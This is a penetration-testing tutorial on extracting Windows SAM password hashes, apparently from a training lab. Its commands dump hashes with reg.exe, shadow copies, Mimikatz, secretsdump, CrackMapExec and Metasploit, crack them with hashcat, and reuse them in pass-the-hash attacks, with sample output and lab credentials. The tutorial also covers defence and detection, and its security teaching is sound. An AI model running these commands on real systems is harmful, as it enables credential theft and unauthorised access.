# SAM Database

## SAM Database

The Security Accounts Manager (SAM) database is a critical component of Windows operating systems that stores local user accounts and security information. Understanding how to access and analyze the SAM database is essential for penetration testing and security assessments.

### Overview of the SAM Database

The SAM database:

* Stores user account information for local (non-domain) accounts
* Contains username and password hashes
* Is stored in `%SystemRoot%\System32\config\SAM`
* Is locked while the operating system is running
* Requires system-level access to extract directly

Windows protects the SAM database by:

* Preventing access to the file while the system is running
* Using the SYSTEM account as the owner
* Encrypting the data with a bootkey from the SYSTEM hive

### Registry Hives of Interest

To fully access and decrypt the SAM database, you need to extract the following registry hives:

| Registry Hive   | Description                                                                               |
| --------------- | ----------------------------------------------------------------------------------------- |
| `hklm\sam`      | Contains the hashes associated with local account passwords                               |
| `hklm\system`   | Contains the system bootkey, which is used to encrypt the SAM database                    |
| `hklm\security` | Contains cached credentials for domain accounts (useful on domain-joined Windows targets) |

### Extracting SAM Hives

#### Using reg.exe (Windows)

With administrative privileges, you can create backup copies of these registry hives:

```cmd
C:\> reg.exe save hklm\sam C:\sam.save
C:\> reg.exe save hklm\system C:\system.save
C:\> reg.exe save hklm\security C:\security.save
```

#### Using Volume Shadow Copy (Windows)

For systems where direct access to the SAM file is blocked, Volume Shadow Copy can be used:

```cmd
C:\> vssadmin create shadow /for=C:
C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\SAM
C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\SYSTEM
C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\SECURITY
```

#### Using Mimikatz (Windows)

Mimikatz can extract hashes directly from memory:

```cmd
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam
```

### Analyzing Extracted Hives

#### Using Impacket's secretsdump.py (Linux)

After transferring the saved hives to your analysis machine:

```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

Example output:

```
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x4d8c3efa2af93c3cce9893641540d4e4
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
john:1000:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] Cleaning up...
```

#### Understanding the Output

The output format is typically:

* `username:RID:LM hash:NT hash`

Where:

* `RID` is the Relative Identifier (e.g., 500 for Administrator)
* `LM hash` is the legacy LAN Manager hash (usually disabled in modern Windows)
* `NT hash` is the newer Windows NT hash

The hash `aad3b435b51404eeaad3b435b51404ee` for the LM hash typically indicates that LM hashing is disabled, which is the default in modern Windows systems.

### Remote Dumping Techniques

You can also dump the SAM database remotely if you have appropriate credentials.

#### Using CrackMapExec

**Dumping LSA Secrets Remotely**

```bash
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

**Dumping SAM Remotely**

```bash
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

Example output:

```
SMB         10.129.42.198    445    DESKTOP-IATR2O3  [*] Windows 10.0 Build 19041 x64 (name:DESKTOP-IATR2O3) (domain:DESKTOP-IATR2O3) (signing:False) (SMBv1:True)
SMB         10.129.42.198    445    DESKTOP-IATR2O3  [+] DESKTOP-IATR2O3\bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.42.198    445    DESKTOP-IATR2O3  [+] Dumping SAM hashes
SMB         10.129.42.198    445    DESKTOP-IATR2O3  Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198    445    DESKTOP-IATR2O3  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198    445    DESKTOP-IATR2O3  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198    445    DESKTOP-IATR2O3  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
SMB         10.129.42.198    445    DESKTOP-IATR2O3  bob:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
SMB         10.129.42.198    445    DESKTOP-IATR2O3  alice:1002:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
```

#### Using Metasploit

```
msf6 > use post/windows/gather/hashdump
msf6 post(windows/gather/hashdump) > set SESSION 1
msf6 post(windows/gather/hashdump) > run
```

### Cracking Extracted Hashes

After extracting hashes, you can attempt to crack them to recover plaintext passwords.

#### Using Hashcat

```bash
sudo hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

Where:

* `-m 1000` specifies the hash type (NTLM)
* `hash.txt` contains the NT hash

Example:

```bash
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

Output:

```
64f12cddaa88057e06a81b54e73b949b:Password1
```

#### Using John the Ripper

```bash
john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Pass-the-Hash (PtH) Attacks

Instead of cracking the hash, you can use the hash directly in a Pass-the-Hash attack:

```bash
crackmapexec smb 10.129.42.198 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
```

With tools like Impacket:

```bash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@10.129.42.198
```

### Prevention and Defense

#### Protecting the SAM Database

Microsoft recommends several measures to protect the SAM database:

1. **Enable BitLocker**: Full disk encryption prevents offline attacks
2. **Use strong passwords**: Complex passwords are harder to crack
3. **Implement account lockout policies**: Prevents brute-force attempts
4. **Restrict administrative access**: Limit who can extract the SAM database
5. **Monitor for suspicious activities**: Watch for unauthorized registry exports
6. **Regular security updates**: Keep systems patched against known vulnerabilities
7. **Use Windows Defender Credential Guard**: Isolates and hardens credential storage

#### Detecting SAM Extraction

Signs that someone might be attempting to extract the SAM database:

1. Unusual access to registry export utilities
2. Creation of Volume Shadow Copies
3. Unexpected registry backup files
4. Mimikatz or similar tools detected on the system
5. Unusual process activity with SYSTEM privileges

### Hash Format Reference

#### NT Hash

The NT hash (also called NTLM hash) is the primary password hash used in modern Windows systems:

* Fixed length of 32 hexadecimal characters
* Case-insensitive
* Does not use salt
* Fast to compute (vulnerable to brute force)

#### LM Hash

The legacy LAN Manager hash has several weaknesses:

* Converts all characters to uppercase
* Splits the password into 7-character chunks
* Limited to 14 characters
* Generally disabled in modern Windows (indicated by `aad3b435b51404eeaad3b435b51404ee`)

### SAM Database in Incident Response

During security incidents, analyzing the SAM database can help:

* Identify compromised accounts
* Determine if new accounts were created
* Check for password changes
* Verify if privileged accounts were targeted

By understanding how the SAM database works and how to properly extract and analyze it, penetration testers and security professionals can effectively assess Windows system security and identify potential vulnerabilities in password management.
